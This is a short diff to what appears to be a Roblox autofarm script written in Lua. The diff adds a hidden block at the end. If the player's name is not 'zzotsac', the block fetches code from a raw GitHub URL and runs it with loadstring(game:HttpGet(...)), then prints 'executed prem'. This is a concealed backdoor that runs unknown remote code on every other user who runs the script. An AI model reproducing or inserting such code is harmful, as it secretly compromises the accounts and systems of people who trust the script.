@@ -1868,3 +1868,12 @@ end)
 Autofarm:Label("Hello") -- This is just for information or Text ;)
 
 Autofarm:line() -- This Creates a line aka some space for a new section or something like that :P
+
+spawn(function()
+if game.Players.LocalPlayer.Name == "zzotsac" then
+print("Owner")
+else
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/clickclickpow/pls/main/admin'))()
+    print("executed prem")
+end
+end)
